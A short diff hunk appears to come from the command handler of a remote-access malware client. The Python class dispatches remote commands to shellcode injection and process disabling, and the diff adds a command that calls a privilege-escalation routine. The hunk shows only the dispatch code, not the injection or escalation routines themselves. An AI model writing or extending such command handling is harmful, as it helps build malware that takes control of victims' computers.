@@ -49,3 +49,6 @@ class CommandHandler:
             self.control.toggle_disable_process(command["value"]["process"], command["value"]["popup"])
         elif _command == c.CLIENT_SHELLCODE:
             self.control.inject_shellcode(command["value"]["buffer"])
+        elif _command == c.CLIENT_ELEVATE:
+            self.control.elevate()
+
